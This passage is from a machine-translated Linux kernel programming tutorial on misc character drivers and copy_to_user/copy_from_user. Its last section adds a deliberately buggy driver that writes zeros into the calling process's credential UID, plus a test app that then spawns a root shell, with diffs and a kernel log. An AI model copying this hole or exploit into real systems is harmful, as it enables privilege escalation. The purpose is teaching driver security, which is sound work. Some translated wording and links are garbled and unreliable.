在验证我们的驱动程序(LKM)被插入后，我们发出`dd(1)`命令，让它从我们的设备中读取 4，096 字节(因为块大小(`bs`)被设置为`4k`，`count`被设置为`1`)。我们让它将输出(通过`of=`选项开关)写入名为`readtest`的文件。查内核日志，可以看到(*图 1.5* )的`dd`进程确实打开了我们的设备(我们的`PRINT_CTX()`宏的输出显示是当前运行我们驱动的代码的进程上下文！).接下来，我们可以看到(通过`pr_fmt()`的输出)，控制转到我们的驱动程序读取方法，在该方法中，我们发出一个简单的`printk`并返回表示成功的值 4096(尽管我们确实没有读取任何内容！).然后通过`dd`关闭装置。此外，使用`hexdump(1)`实用程序快速检查后发现，我们确实从驱动程序(在文件`readtest`中)收到了`0x1000` (4，096 个)空值(如预期的那样)；一定要意识到这是因为`dd`将其读取缓冲区初始化为`NULL` s。

The `PRINT_CTX()` macro we have used within the code lives within our `convenient.h` header. Do take a look; it's quite instructive (we try and emulate the kernel `Ftrace` infrastructure's latency output format, which reveals a lot of detail in a small space, a single line of output). This is explained in detail in [Chapter 4](4.html), *Handling Hardware Interrupts*, in the *Fully figuring out the context* section. Don't worry about all the details for now...

*图 1.6* 显示了我们如何(最低限度地)通过`dd(1)`测试对驾驶员的书写。这次我们读取`4k`的随机数据(通过利用内核内置的`mem`驱动的`/dev/urandom`工具)，并将随机数据写入我们的设备节点；实际上，对于我们的“设备”:

![](assets/3bf0f7e7-4cc3-49a7-a935-1bc099c22e46.png)

Figure 1.6 – Screenshot showing us minimally testing our miscdrv driver's write method via dd(1)

(顺便说一下，我还为驱动程序包含了一个简单的用户空间测试 app 可以在这里找到:`ch1/miscdrv/rdwr_test.c`。我将把它留给你去阅读它的代码并试用。)

你可能会想:我们确实成功地在用户空间和我们的驱动程序之间读写了数据，但是，等等，我们实际上从未在驱动程序代码中看到任何数据传输。是的，这是下一节的主题:如何将数据从用户空间进程缓冲区复制到内核驱动程序缓冲区，反之亦然。继续读！

# 将数据从内核复制到用户空间，反之亦然

设备驱动程序的主要工作是使用户空间应用程序能够透明地向外围硬件设备(通常是某种芯片；它可能根本不是硬件)，将设备视为普通文件。因此，为了从设备读取数据，应用程序打开对应于该设备的设备文件，从而获得文件描述符，然后简单地使用该`fd`(【图 1.7】中的*步骤 1*)发出`read(2)`系统调用！内核 VFS 拦截读取，正如我们所看到的，控制流向底层设备驱动程序的读取方法(当然，这是一个 C 函数)。驱动程序代码现在与硬件设备“对话”，实际执行输入/输出、读取操作。(硬件读取(或写入)的具体执行方式在很大程度上取决于硬件的类型——是内存映射设备、端口、网络芯片等等？我们在此不再深入探讨；下一章会。)驱动程序从设备读取数据后，现在将这些数据放入内核缓冲区`kbuf` ( *步骤 2* 如下图所示。当然，我们假设驱动作者通过`[k|v]malloc()`或另一个合适的内核 API 为其分配了内存。

我们现在在内核空间缓冲区中有硬件设备数据。我们应该如何把它转移到用户空间进程的内存缓冲区？我们将开发内核 API，使之变得容易；接下来将介绍这一点。

## 利用内核 API 来执行数据传输

现在，如前所述，让我们假设您的驱动程序已经读入了硬件数据，并且它现在存在于内核内存缓冲区中。我们如何把它转移到用户空间？一个天真的方法是简单地尝试通过`memcpy()`执行，但是*不，*不起作用(为什么？一是缺乏安全感，二是非常依赖拱门；它适用于某些架构，不适用于其他架构)。因此，一个关键点是:内核提供了两个内联函数来将数据从内核传输到用户空间，反之亦然。分别是`copy_to_user()`和`copy_from_user()`，确实非常常用。

使用它们很简单。两者都取三个参数:`to` 指针(目的缓冲区)、`from` 指针(源缓冲区)和`n`，要复制的字节数(就像对一个`memcpy`操作一样):

```sh
include <linux/uaccess.h>   /* Note! used to be <asm/uaccess.h> upto 4.11 */

unsigned long copy_to_user(void __user *to, const void *from, unsigned long n);
unsigned long copy_from_user(void *to, const void __user *from, unsigned long n);
```

返回值为*未拷贝的*字节数；换句话说，`0`的返回值表示成功，非零的返回值表示给定的字节数没有被复制。如果发生非零返回，您应该(按照通常的`0/-E`返回惯例)通过返回`-EIO`或`-EFAULT`返回指示输入/输出故障的错误(从而将用户空间中的`errno`设置为正值)。以下(伪)代码说明了设备驱动程序如何使用`copy_to_user()`函数将一些数据从内核复制到用户空间:

```sh
static ssize_t read_method(struct file *filp, char __user *ubuf, size_t count, loff_t *off)
{
     char *kbuf = kzalloc(...);
     [ ... ]
     /* ... do what's required to get data from the hardware device into kbuf ... */
    if (copy_to_user(buf, kbuf, count)) {
        dev_warn(dev, "copy_to_user() failed\n");
        goto out_rd_fail;
    }
    [ ... ]
    return count;    /* success */
out_rd_fail:
    kfree(kbuf);
 return -EIO; /* or -EFAULT */
}
```

当然，这里我们假设您有一个有效分配的内核内存缓冲区，`kbuf`，和一个有效的设备指针(`struct device *dev`)。*图 1.7* 说明了前面的(伪)代码试图实现的目标:

![](assets/2ddabab1-d742-40ea-992e-89083c8e7fdd.png)

Figure 1.7 – Read: copy_to_user(): copying data from the hardware to a kernel buffer and from there to a user space buffer

相同的语义适用于使用`copy_from_user()`内联函数。它通常在驱动程序的 write 方法的上下文中使用，将用户空间进程上下文写入的数据拉入内核空间缓冲区。我们会让你想象这个。

同样重要的是要认识到，两个例程(`copy_[from|to]_user()`)在运行期间都可能导致进程上下文(页面)出错，从而休眠；换句话说，调用调度程序。因此，**它们只能在可以安全休眠的进程上下文中使用，绝不能在任何原子或中断上下文**中使用(我们将在[第 4 章](4.html)、*处理硬件中断*的*不阻塞—发现可能阻塞的代码* *路径*一节中详细解释`might_sleep()`助手—一个调试助手)。

对于好奇的读者(希望你也是！)，这里有一些链接，更详细地解释了为什么不能只使用简单的`memcpy()`，而必须使用`copy_[from|to]_user()`内联函数在内核和用户空间之间复制数据:

*   [ht](https://stackoverflow.com/questions/14970698/copy-to-user-vs-memcpy)[TPS://stack overflow . com/questions/14970698/copy-to-user-vs memcpy](https://stackoverflow.com/questions/14970698/copy-to-user-vs-memcpy) [](https://stackoverflow.com/questions/14970698/copy-to-user-vs-memcpy) 
*   [https:](https://www.quora.com/Why-we-need-copy_from_user-as-the-kernel-can-access-all-the-memory-If-we-see-the-copy_from_user-implementation-again-we-are-copying-data-to-the-kernel-memory-using-memcpy-Doesnt-it-an-extra-overhead)[//www . quora . com/Why-we-copy _ from _ user-as-the-kernel-can-access-all-mem-If-we-the-copy _ from _ user-implementation-re-we-copy-data-to-kernel-memcpy-memcpy-not-it-a-extra-overhealth](https://www.quora.com/Why-we-need-copy_from_user-as-the-kernel-can-access-all-the-memory-If-we-see-the-copy_from_user-implementation-again-we-are-copying-data-to-the-kernel-memory-using-memcpy-Doesnt-it-an-extra-overhead)。

在下一节中，我们将编写一个更完整的`misc`框架字符设备驱动程序，它将实际执行一些 I/O，读写数据。

# 有秘密的杂项司机

既然您已经了解了如何在用户和内核空间之间复制数据(反之亦然)，那么让我们基于之前的框架(`ch1/miscdrv/`)杂项驱动程序编写另一个设备驱动程序(`ch1/miscdrv_rdwr`)。主要区别在于，我们始终使用一些全局数据项(在一个结构中)，并且实际上以读写的形式执行一些输入/输出。这里，让我们引入**驱动程序上下文或私有驱动程序数据结构**的概念；这个想法是要有一个方便访问的数据结构，在一个地方包含所有相关信息。在这里，我们将这个结构命名为`struct drv_ctx`(参见下面的代码清单)。在驱动程序初始化时，我们分配内存并初始化它。

好吧，这里没有真正的秘密，只是听起来很有趣。我们的这个驱动程序上下文数据结构中的一个成员是所谓的秘密消息(它是`drv_ctx.oursecret`成员，以及一些(伪造的)统计数据和配置字)。这是我们建议使用的简单“驱动程序上下文”或私有数据结构:

```sh
// ch1/miscdrv_rdwr/miscdrv_rdwr.c
[ ... ]
/* The driver 'context' (or private) data structure;
 * all relevant 'state info' reg the driver is here. */
struct drv_ctx {
    struct device *dev;
    int tx, rx, err, myword;
    u32 config1, config2;
    u64 config3;
#define MAXBYTES 128 /* Must match the userspace app; we should actually
                      * use a common header file for things like this */
    char oursecret[MAXBYTES];
};
static struct drv_ctx *ctx;
```

太好了；现在让我们继续查看和理解代码。

## 编写“秘密”杂项设备驱动程序代码

我们将关于我们的秘密杂项字符设备驱动程序的实现细节的讨论分为五个部分:驱动程序初始化、读取方法、写入方法功能实现、驱动程序清理，最后是将使用我们的设备驱动程序的用户空间应用程序。

### 我们的秘密驱动程序——初始化代码

在我们的秘密设备驱动程序的`init`代码中(当然是内核模块，因此在`insmod(8)`上调用)，我们首先向内核注册驱动程序作为`misc`角色驱动程序(通过`misc_register()` API，如前面的*编写杂项驱动程序代码–第 1 部分*一节所见；我们在此不再重复这段代码)。

接下来，我们为驱动程序的“上下文”结构分配内核内存–通过有用的托管分配`devm_kzalloc()` API(正如您在配套指南 *Linux 内核编程、* [第 8 章](1.html)、*模块作者的内核内存分配–第 1 部分*、在*中使用内核的资源托管内存分配 API*部分所学习的那样)–并初始化它。请注意，您必须确保首先获得设备指针`dev`，然后才能使用该 API 我们从我们的`miscdevice`结构的`this_device`成员中检索它(如图所示):

```sh
// ch1/miscdrv_rdwr/​miscdrv_rdwr.c
[ ... ]
static int __init miscdrv_rdwr_init(void)
{
    int ret;
    struct device *dev;

    ret = misc_register(&llkd_miscdev);
    [ ... ]
    dev = llkd_miscdev.this_device;
    [ ... ]
    ctx = devm_kzalloc(dev, sizeof(struct drv_ctx), GFP_KERNEL);
    if (unlikely(!ctx))
        return -ENOMEM;

    ctx->dev = dev;
    strscpy(ctx->oursecret, "initmsg", 8);
    [ ... ]
    return 0;         /* success */
}
```

好的，很明显，我们已经初始化了我们的`ctx`私有结构实例的`dev`成员，以及`'initmsg'`字符串的“秘密”字符串(不是一个非常令人信服的秘密，但是让我们就这样吧)。这里的思想是，当用户空间进程(或线程)打开我们的设备文件并在其上发布`read(2)`时，我们将秘密传递(复制)给它；我们通过调用`copy_to_user()`助手函数来实现！同样，当用户模式应用程序向我们写入数据时(是的，通过`write(2)`系统调用)，我们认为写入的数据是新的秘密。因此，我们通过`copy_from_user()`助手函数从用户空间缓冲区获取它，并在驱动程序内存中更新它。

Why not simply use the `strcpy()` (or `strncpy()`) API to initialize the `ctx->oursecret` member? This is very important: they aren't safe enough security-wise. Also, the `strlcpy()` API has been marked as **deprecated** by the kernel community ([https://www.kernel.org/doc/html/latest/process/deprecated.html#strlcpy](https://www.kernel.org/doc/html/latest/process/deprecated.html#strlcpy)). In general, always avoid using deprecated stuff, as documented in the kernel documentation here: [https://www.kernel.org/doc/html/latest/process/deprecated.html#deprecated-interfaces-language-features-attributes-and-conventions](https://www.kernel.org/doc/html/latest/process/deprecated.html#deprecated-interfaces-language-features-attributes-and-conventions).

很明显，这个新驱动程序有趣的部分是输入/输出功能——读和写的方法；继续！

### 我们的秘密驱动因素——读取方法

我们将首先展示 read 方法的相关代码——这是用户空间进程(或线程)如何读入我们的驱动程序(在其上下文结构中)中的秘密信息:

```sh
static ssize_t
read_miscdrv_rdwr(struct file *filp, char __user *ubuf, size_t count, loff_t *off)
{
    int ret = count, secret_len = strlen(ctx->oursecret);
    struct device *dev = ctx->dev;
    char tasknm[TASK_COMM_LEN];

    PRINT_CTX();
    dev_info(dev, "%s wants to read (upto) %zd bytes\n", get_task_comm(tasknm, current), count);

    ret = -EINVAL;
    if (count < MAXBYTES) {
    [...] *<< we don't display some validity checks here >>*

    /* In a 'real' driver, we would now actually read the content of the
     * [...]
     * Returns 0 on success, i.e., non-zero return implies an I/O fault).
     * Here, we simply copy the content of our context structure's 
 * 'secret' member to userspace. */
    ret = -EFAULT;
    if (copy_to_user(ubuf, ctx->oursecret, secret_len)) {
        dev_warn(dev, "copy_to_user() failed\n");
        goto out_notok;
    }
    ret = secret_len;

    // Update stats
    ctx->tx += secret_len; // our 'transmit' is wrt this driver
    dev_info(dev, " %d bytes read, returning... (stats: tx=%d, rx=%d)\n",
            secret_len, ctx->tx, ctx->rx);
out_notok:
    return ret;
}
```

`copy_to_user()`例程完成它的工作——它将`ctx->oursecret`源缓冲区复制到`secret_len`字节的目的地指针`ubuf`用户空间缓冲区，从而将秘密传输到用户空间应用程序。现在，让我们来看看驱动程序的编写方法。

### 我们的秘密驱动因素——写方法

最终用户可以通过对驱动程序的设备节点进行`write(2)`系统调用，将新的秘密写入驱动程序来更改该秘密。内核将写操作(通过 VFS 层)重定向到我们的驱动程序的写方法(正如您在*中了解到的，理解进程、驱动程序和内核之间的联系*部分):

```sh
static ssize_t
write_miscdrv_rdwr(struct file *filp, const char __user *ubuf, size_t count, loff_t *off)
{
    int ret = count;
    void *kbuf = NULL;
    struct device *dev = ctx->dev;
    char tasknm[TASK_COMM_LEN];

    PRINT_CTX();
    if (unlikely(count > MAXBYTES)) { /* paranoia */
        dev_warn(dev, "count %zu exceeds max # of bytes allowed, "
                "aborting write\n", count);
        goto out_nomem;
    }
    dev_info(dev, "%s wants to write %zd bytes\n", get_task_comm(tasknm, current), count);

    ret = -ENOMEM;
    kbuf = kvmalloc(count, GFP_KERNEL);
    if (unlikely(!kbuf))
        goto out_nomem;
    memset(kbuf, 0, count);

    /* Copy in the user supplied buffer 'ubuf' - the data content
     * to write ... */
    ret = -EFAULT;
    if (copy_from_user(kbuf, ubuf, count)) {
        dev_warn(dev, "copy_from_user() failed\n");
        goto out_cfu;
     }

    /* In a 'real' driver, we would now actually write (for 'count' bytes)
     * the content of the 'ubuf' buffer to the device hardware (or 
     * whatever), and then return.
     * Here, we do nothing, we just pretend we've done everything :-)
     */
    strscpy(ctx->oursecret, kbuf, (count > MAXBYTES ? MAXBYTES : count));
    [...]
    // Update stats
    ctx->rx += count; // our 'receive' is wrt this driver

    ret = count;
    dev_info(dev, " %zd bytes written, returning... (stats: tx=%d, rx=%d)\n",
            count, ctx->tx, ctx->rx);
out_cfu:
    kvfree(kbuf);
out_nomem:
    return ret;
}
```

我们使用`kvmalloc()`应用编程接口为一个缓冲区分配内存，以保存我们将要复制的用户数据。当然，实际的复制是通过`copy_from_user()`例程完成的。这里，我们使用它将用户空间应用程序传递的数据复制到我们的内核缓冲区`kbuf`。然后我们(通过`strscpy()`例程)将我们的驾驶员上下文结构的`oursecret`成员更新为该值，从而更新秘密！(对驱动程序的后续阅读现在将揭示新的秘密。)此外，请注意以下几点:

*   我们现在如何一致地使用`dev_xxx()`助手来代替通常的`printk`例程。对于设备驱动程序，建议这样做。
*   `goto`执行最佳错误处理的(现在是典型的)用法。

这包括司机的肉。

### 我们的秘密司机——清理

重要的是要认识到，我们必须释放我们已经分配的任何缓冲区。然而，在这里，当我们在`init`代码(`devm_kzalloc()`)中执行托管分配时，我们的好处是不需要担心清理；内核处理它。当然，在驱动程序的清理代码路径中(在`rmmod(8)`上调用)，我们用内核注销`misc`驱动程序:

```sh
static void __exit miscdrv_rdwr_exit(void)
{
    misc_deregister(&llkd_miscdev);
    pr_info("LLKD misc (rdwr) driver deregistered, bye\n");
}
```

您会注意到，在这个版本的驱动程序中，我们似乎也在某些地方使用了两个全局整数`ga`和`gb`。的确，它们在这里没有真正的意义；我们拥有它们的原因只有在本书的最后两章，内核同步中才会变得清晰。请暂时忽略它们。

On this note, you'll perhaps realize that the way we have arbitrarily accessed global data in this driver **can cause concurrency issue (*data races!*)**; yes indeed; we shall set aside the deep and crucial coverage of kernel concurrency and synchronization to the book's last two chapters.

### 我们的秘密驱动程序——用户空间测试应用程序

仅仅编写内核组件、设备驱动程序是不够的；您还必须编写一个用户空间应用程序，该应用程序将实际使用驱动程序。我们将在这里这样做。(同样，您也可以简单地使用`dd(1)`。)

为了使用设备驱动，用户空间 app 当然要先打开对应的设备文件。(在这里，为了节省空间，我们不显示应用程序代码的全部，只显示其中最相关的部分。我们希望您已经克隆了这本书的 Git 存储库，并开始编写代码。)打开设备文件的代码如下:

```sh
// ch1/miscdrv_rdwr/rdwr_test_secret.c
int main(int argc, char **argv)
{
    char opt = 'r';
    int fd, flags = O_RDONLY;
    ssize_t n;
    char *buf = NULL;
    size_t num = 0;
[...]
    if ('w' == opt)
        flags = O_WRONLY;
    fd = open(argv[2], flags, 0); if (fd== -1) {
    [...]
```

这个应用程序的第二个参数是要打开的设备文件。为了读取或写入，该过程将需要内存:

```sh
    if ('w' == opt)
        num = strlen(argv[3])+1;    // IMP! +1 to include the NULL byte!
    else
        num = MAXBYTES;
    buf = malloc(num);
    if (!buf) {
        [...]
```

接下来，让我们看看让应用程序在(伪)设备上调用读或写(取决于第一个参数为`r`或`w`)的代码块(为简明起见，我们不显示错误处理代码):

```sh
    if ('r' == opt) {
        n = read(fd, buf, num);
        if( n < 0 ) [...]
        printf("%s: read %zd bytes from %s\n", argv[0], n, argv[2]);
        printf("The 'secret' is:\n \"%.*s\"\n", (int)n, buf);
    } else {
        strncpy(buf, argv[3], num);
        n = write(fd, buf, num);
        if( n < 0 ) [ ... ]
        printf("%s: wrote %zd bytes to %s\n", argv[0], n, argv[2]);
    }
    [...]
    free(buf);
    close(fd);
    exit(EXIT_SUCCESS); 
} 
```

(在试用这个驱动之前，一定要确保之前`miscdrv` 驱动的内核模块已经卸载。)现在，当然要确保这个驱动程序已经构建并插入，否则会导致`open(2)`系统调用失败。我们展示了几次试运行。首先，让我们构建用户模式应用程序，插入驱动程序(未在*图 1.8* 中显示)，并从我们刚刚创建的设备节点读取:

![](assets/b40b7ebe-f9d3-4ec2-b1c0-199633935f2c.png)

Figure 1.8 – miscdrv_rdwr: (minimally) testing the read; the original secret is revealed

用户模式应用程序成功从驱动程序接收到 7 个字节；它显示的是(初始)秘密值。内核日志反映了驱动程序初始化，几秒钟后，您可以看到(通过我们发出的`printk`的`dev_xxx()`实例)`rdwr_test_secret`应用程序在进程上下文中运行驱动程序代码。设备的打开、后续读取的运行以及关闭方法清晰可见。(注意流程名称是如何被截断为`rdwr_test_secre`；这是因为任务结构的`comm`成员是进程名，被截断为 16 个字符。)

在*图 1.9* 中，我们展示了写入我们的设备节点的补充动作，改变秘密值；随后的阅读确实揭示了它是有效的:

![](assets/821a37e0-9a8b-4b33-93b0-eb4f40dc8639.png)

Figure 1.9 – miscdrv_rdwr: (minimally) testing the write; a new, excellent secret is written

内核日志中发生写入的部分在*图 1.9* 中突出显示。它有效；我绝对鼓励你自己尝试一下，边走边查看内核日志。

现在，是时候深入挖掘一下了。现实是，作为一名司机作者，你必须学会真正小心对待*安全*，否则各种令人讨厌的惊喜就在等待中。下一节将让您了解这一关键领域。

# 问题和安全关切

对于初露头角的司机作者来说，一个重要的考虑因素是安全性。问题是，即使是驱动程序中非常常见的`copy_[from|to]_user()`函数的简单使用，也会让恶意用户非常容易地——并且非法地——在用户和内核空间中覆盖内存以获取优势。怎么做？以下部分对此进行了详细解释；然后，我们甚至会向你展示一个(有点做作，但仍然有效的)黑客。

## 黑秘密司机

想想看:我们有`copy_to_user()`助手例程；第一个参数是目的地`to`地址，当然应该是用户空间虚拟地址(a UVA)。常规使用将遵守这一点，并提供合法有效的用户空间虚拟地址作为目的地地址，一切都会好的。

但是如果我们没有呢？如果我们传递另一个用户空间地址，或者，取而代之的是一个*内核*虚拟地址(KVA)，会怎么样？`copy_to_user()`代码现在将以内核特权运行，用源地址(第二个参数)中的任何数据覆盖目的地，以获得第三个参数中的字节数！事实上，黑客经常尝试这样的技术，将伪装成数据的代码插入用户空间缓冲区，并以内核权限执行它，导致相当致命的**权限升级** (privesc)场景。

为了清楚地展示不仔细设计和实现驱动程序的不利影响，我们故意引入错误(bug，真的！)到我们以前驱动程序的“坏”版本的读写方法中(尽管在这里，我们只考虑非常常见的`copy_[from|to]_user()`例程的场景，而不考虑其他)。

为了获得更多的实际体验，我们将编写一个`ch1/miscdrv_rdwr`驱动程序的“坏”版本。我们称之为(非常聪明地)`ch1/bad_miscdrv`。在这个版本中，我们特意内置了两条有问题的代码路径:

*   一个在驱动程序的读取方法中
*   另一个，更令人兴奋的，你很快就会看到，在写作方法。

让我们两个都看看。我们将从错误阅读开始。

### 错误的驱动程序–错误的读取()

为了帮助您了解代码中发生了什么变化，我们首先将这个(故意的)糟糕的驱动程序代码与我们之前的(好的)版本执行`diff(1)`，当然会产生差异(在下面的代码片段中，我们将输出缩减为最相关的部分):

```sh
// in ch1/bad_miscdrv
$ diff -u ../miscdrv_rdwr/miscdrv_rdwr.c bad_miscdrv.c
[ ... ]
+#include <linux/cred.h>            ​// access to struct cred
#include "../../convenient.h"
[ ... ]
static ssize_t read_miscdrv_rdwr(struct file *filp, char __user *ubuf,
[ ... ]
+ void *kbuf = NULL;
+ void *new_dest = NULL;
[ ... ]
+#define READ_BUG
+//#undef READ_BUG
+#ifdef READ_BUG
[ ... ]
+ new_dest = ubuf+(512*1024);
+#else
+ new_dest = ubuf;
+#endif
[ ... ]
+ if (copy_to_user(new_dest, ctx->oursecret, secret_len)) {
[ ... ]
```

所以，应该很清楚:在我们的‘坏’驱动程序的读取方法中，如果定义了`READ_BUG`宏，我们就改变用户空间目标指针指向一个非法位置(超出我们实际应该复制数据的位置 512 KB！).这证明了这一点:我们可以做像这样的任意事情，因为我们是以内核特权*运行的。*它会引起问题和 bug 是另一回事。

让我们试试:首先，确保您已经构建并加载了`bad_miscdrv`内核模块(您可以使用我们的`lkm`便利脚本来这样做)。我们的试运行，通过我们的`ch1/bad_miscdrv/rdwr_test_hackit`用户模式应用发出`read(2)`系统调用，导致失败(见下面的截图):

![](assets/7beb9fad-e2d5-495f-8d72-951812ac41e1.png)

Figure 1.10 – Screenshot showing our bad_miscdrv misc driver performing a "bad" read

啊，这个有意思；我们的测试应用程序(`rdwr_test_hackit` ) `read(2)`系统调用确实失败了，而`perror(3)`例程将失败的原因指示为`Bad address`。但是为什么呢？为什么以内核特权运行的驱动程序没有写错目的地址(这里是`0x5597245d46b0`；正如我们所知，它试图在正确的目的地址之前写入 512 KB*。我们特意编写了驱动程序的 read 方法代码来做到这一点)。*

 *这是因为内核确保`copy_[from|to]_user()`例程在试图读取或写入非法地址时会(理想情况下)失败！在内部，要做几个检查:`access_ok()`是一个简单的检查，仅仅是确保在预期的段(用户或内核)内执行输入/输出。现代 Linux 内核有优越的检查；除了简单的`access_ok()`检查，内核然后涉水通过——如果启用的话——一个编译器工具特性——T4 KASAN(**内核地址杀毒软件**；KASAN 确实很好用，开发测试期间的一个*必做*！)，检查对象大小(包括溢出检查)，然后才调用执行实际复制的工作例程`raw_copy_[from|to]_user()`。

好，那很好；现在，让我们转到更有趣的案例，buggy write，我们将安排(以一种做作的方式)进行攻击！继续读...

### 糟糕的驱动程序-错误的 write()-一个特权！

恶意黑客真正想要的是什么，他们的圣杯？系统上的一个根壳，当然(*得到了根？*)。在我们的驱动程序的编写方法中有大量人为的代码(因此使得这个黑客不是一个真正好的；挺学术的)，我们去拿吧！为此，我们修改了用户模式应用程序和设备驱动程序。让我们先看看用户模式应用的变化。

#### 用户空间测试应用程序修改

我们稍微修改了用户空间应用程序——实际上是我们的流程上下文。这个用户模式测试应用的特殊版本在一个方面不同于早期版本:我们现在有一个名为`HACKIT`的宏。如果定义了它(默认情况下是这样的)，这个过程将故意只在用户空间缓冲区中写入零，并将其发送给我们糟糕的驱动程序的写方法。如果驱动程序定义了`DANGER_GETROOT_BUG`宏(默认情况下)，那么它会将零写入进程的 UID 成员，从而使用户模式进程获得根权限！

In the traditional Unix/Linux paradigm, if the **Real User ID** (**RUID**) and/or **Effective User ID** (**EUID**) (they're within the task structure, in `struct cred`) are set to the special value zero (`0`), it implies that the process has superuser (root) powers. Nowadays, the POSIX Capabilities model is considered a superior way to work with privileges, as it allows assigning fine-grained permissions – *capabilities* – on a thread, as opposed to giving a process or thread complete control over the system as root.

以下是上一版本用户空间测试应用的快速`diff`，允许您查看对代码所做的更改(同样，我们将输出缩减为最相关的内容):

```sh
// in ch1/bad_miscdrv
$ diff -u ../miscdrv/rdwr_test.c rdwr_test_hackit.c
[ ... ]
+#define HACKIT
[ ... ]
+#ifndef HACKIT
+     strncpy(buf, argv[3], num);
+#else
+     printf("%s: attempting to get root ...\n", argv[0]);
+     /*
+      * Write only 0's ... our 'bad' driver will write this into
+      * this process's current->cred->uid member, thus making us
+      * root !
+      */
+     memset(buf, 0, num);
 #endif
- } else { // test writing ..
          n = write(fd, buf, num);
[ ... ]
+     printf("%s: wrote %zd bytes to %s\n", argv[0], n, argv[2]);
+#ifdef HACKIT
+     if (getuid() == 0) {
+         printf(" !Pwned! uid==%d\n", getuid());
+         /* the hacker's holy grail: spawn a root shell */
+         execl("/bin/sh", "sh", (char *)NULL);
+     }
+#endif
[ ... ]
```

这确实意味着(所谓的)秘密永远不会被写出来；没关系。现在，让我们看看对驱动程序所做的修改。

#### 设备驱动程序修改

为了了解我们糟糕的`misc`驱动程序的编写方法是如何变化的，我们将继续关注我们在*糟糕的驱动程序-童车阅读()*部分中所做的相同的`diff`(我们糟糕的驱动程序与优秀的驱动程序的对比)。以下`diff`操作的代码中的注释是不言自明的。看看吧:

```sh
// in ch1/bad_miscdrv
$ diff -u ../miscdrv_rdwr/miscdrv_rdwr.c bad_miscdrv.c
[...]           
         // << this is within the driver's write method >>
 static ssize_t write_miscdrv_rdwr(struct file *filp, const char __user *ubuf,
 size_t count, loff_t *off)
 {
        int ret = count;
        struct device *dev = ctx->dev;
+       void *new_dest = NULL;
[ ... ]
+#define DANGER_GETROOT_BUG
+//#undef DANGER_GETROOT_BUG
+#ifdef DANGER_GETROOT_BUG
+     /* Make the destination of the copy_from_user() point to the current
+      * process context's (real) UID; this way, we redirect the driver to
+      * write zero's here. Why? Simple: traditionally, a UID == 0 is what
+      * defines root capability!
+      */
+      new_dest = &current->cred->uid; +      count = 4; /* change count as we're only updating a 32-bit quantity */
+      pr_info(" [current->cred=%px]\n", (TYPECST)current->cred);
+#else
+      new_dest = kbuf;
+#endif
```

前面代码的重点是当`DANGER_GETROOT_BUG`宏被定义时(默认情况下是这样的)，我们将`new_dest`指针设置为凭证结构内的(真实的)UID 成员的地址，对于这个流程上下文来说，它本身就在任务结构内(由`current`引用)！(如果所有这些听起来都很陌生，请阅读配套指南 *Linux 内核编程、* [第 6 章](1.html)、*内核内部要素–进程和线程*)。这样，当我们调用`copy_to_user()`例程来执行对用户空间的写入时，它实际上将向`current->cred`内的进程 UID 成员写入零。UID 为零是(传统上)根的定义。此外，请注意我们如何将写入限制为 4 个字节(因为我们只写入 32 位数量)。

(顺便说一下，我们的“坏”司机确实发出了警告；这里，它是有意的，我们只是忽略它):

```sh
Linux-Kernel-Programming-Part-2/ch1/bad_miscdrv/bad_miscdrv.c:229:11: warning: assignment discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
 229 | new_dest = &current->cred->uid;
 |          ^
```

下面是`copy_from_user()`代码调用:

```sh
[...]
+       dev_info(dev, "dest addr = " ADDRFMT "\n", (TYPECST)new_dest);
        ret = -EFAULT;
-       if (copy_from_user(kbuf, ubuf, count)) {
+       if (copy_from_user(new_dest, ubuf, count)) {
                dev_warn(dev, "copy_from_user() failed\n");
                goto out_cfu;
        }
[...]
```

显然，前面的`copy_to_user()`例程会将用户提供的缓冲区`ubuf`写入`new_dest`目的地缓冲区，关键的是，我们已经指出`current->cred->uid`为`count`字节。

#### 让我们现在扎根

当然，布丁的证据在吃，对吗？所以，让我们给我们的黑客一个旋转；在这里，我们假设您首先卸载了任何以前版本的‘杂项’驱动程序，并构建了`bad_miscdrv`内核模块并将其加载到内存中:

![](assets/b3477088-14a9-4ae5-9f29-8fdca1ffd939.png)

Figure 1.11 – Screenshot showing our bad_miscdrv misc driver performing a "bad" write, resulting in root – a privesc!

看看吧；**我们果然扎了根！**我们的`rdwr_test_hackit`应用程序，检测到我们有根(通过一个简单的`getuid(2)`系统调用)，然后做合乎逻辑的事情:它执行一个根Shell(通过一个`execl(3)`应用编程接口)，瞧，我们在一个根Shell中着陆。我们显示内核日志:

```sh
$ dmesg 
[ 63.847549] bad_miscdrv:bad_miscdrv_init(): LLKD 'bad' misc driver (major # 10) registered, minor# = 56
[ 63.848452] misc bad_miscdrv: A sample print via the dev_dbg(): (bad) driver initialized
[ 84.186882] bad_miscdrv:open_miscdrv_rdwr(): 000) rdwr_test_hacki :2765 | ...0 /* open_miscdrv_rdwr() */
[ 84.190521] misc bad_miscdrv: opening "bad_miscdrv" now; wrt open file: f_flags = 0x8001
[ 84.191557] bad_miscdrv:write_miscdrv_rdwr(): 000) rdwr_test_hacki :2765 | ...0 /* write_miscdrv_rdwr() */
[ 84.192358] misc bad_miscdrv: rdwr_test_hacki wants to write 4 bytes to (original) ubuf = 0x55648b8f36b0
[ 84.192971] misc bad_miscdrv: [current->cred=ffff9f67765c3b40]
[ 84.193392] misc bad_miscdrv: dest addr = ffff9f67765c3b44 count=4
[ 84.193803] misc bad_miscdrv: 4 bytes written, returning... (stats: tx=0, rx=4)
[ 89.002675] bad_miscdrv:close_miscdrv_rdwr(): 000) [sh]:2765 | ...0 /* close_miscdrv_rdwr() */
[ 89.005992] misc bad_miscdrv: filename: "bad_miscdrv"
$ 
```

你可以看到它是如何工作的:最初的用户模式缓冲区`ubuf`内核虚拟地址是`0x55648b8f36b0`。在黑客攻击中，我们将其修改为新的目的地址(内核虚拟地址)`0xffff9f67765c3b44`，这是`struct cred`UID 成员的内核虚拟地址(在进程的任务结构中)。不仅如此，我们的驱动程序还将写入的字节数(`count`)修改为`4`(字节)，因为我们正在更新一个 32 位的量。

请注意:这些黑客只是-黑客。它们肯定会导致您的系统变得不稳定(当在我们的“调试”内核上运行时，KASAN 实际上检测到了空指针取消引用！).

这些演示证明了一个事实，即作为内核和/或驱动程序作者，您必须时刻警惕编程问题、安全性等。至此，我们完成了这一部分，甚至这一章。

# 摘要

关于在 Linux 操作系统上编写简单的`misc`类字符设备驱动程序的这一章到此结束；所以，太棒了，你现在知道了在 Linux 上编写设备驱动程序的基础知识！

